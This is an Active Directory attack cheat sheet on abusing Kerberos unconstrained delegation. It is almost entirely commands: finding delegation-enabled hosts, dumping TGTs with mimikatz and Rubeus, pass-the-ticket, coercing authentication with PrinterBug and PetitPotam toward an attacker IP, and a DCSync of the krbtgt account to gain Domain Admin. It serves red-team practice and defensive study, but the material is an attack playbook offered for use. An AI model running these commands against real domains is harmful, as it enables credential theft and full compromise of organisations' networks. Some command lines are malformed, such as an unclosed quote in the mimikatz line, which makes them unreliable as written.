# Unconstrained Delegation

The first hop server can request access to any service on any computer

## Requirements: UAC: ADS_UF_TRUSTED_FOR_DELEGATION

## Tools: Rubeus , mimikatz 

# Enumerate Computers with Unconstrained Delegation

    Get-NetComputer -UnConstrained

##### With AD Module

    Get-ADComputer -Filter {TrustedForDelegation -eq $True}
    Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Get tickets

After compromising the computer with UD enabled, we can trick or wait for an admin connection

#### 1) mimikatz

    mimikatz "privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export (Get TGT ticket)

#### 2) Rubeus

    Rubeus dump /service:krbtgt /nowrap (Get TGT ticket)

    Rubeus dump /luid:0xdeadbeef /nowrap (Get TGT ticket)

# Reuse the ticket (Pass-the-Ticket

    Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'

# Force_coercion_with_coerced_auth

#### 1) To force another computer to connect to the compromised machine in UD, and capture the TGT by monitoring:

    Rubeus monitor /interval:5 /nowrap (Get TGT)

On the attacking machine, run

##### PrinterBug

    .\MS-RPRN.exe \\<target>.domain.local \\unconstrainedMachine.domain.local

##### PetitPotam

    .\PetitPotam.exe attacker_ip <target>.domain.local

### We get the ticket, then we move laterally with Pass the Ticket. If the target is a DC, we do a DC Sync to get Domain Admin access

    .\Rubeus.exe ptt /ticket:...

##### DCSync with the dc TGT

    Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
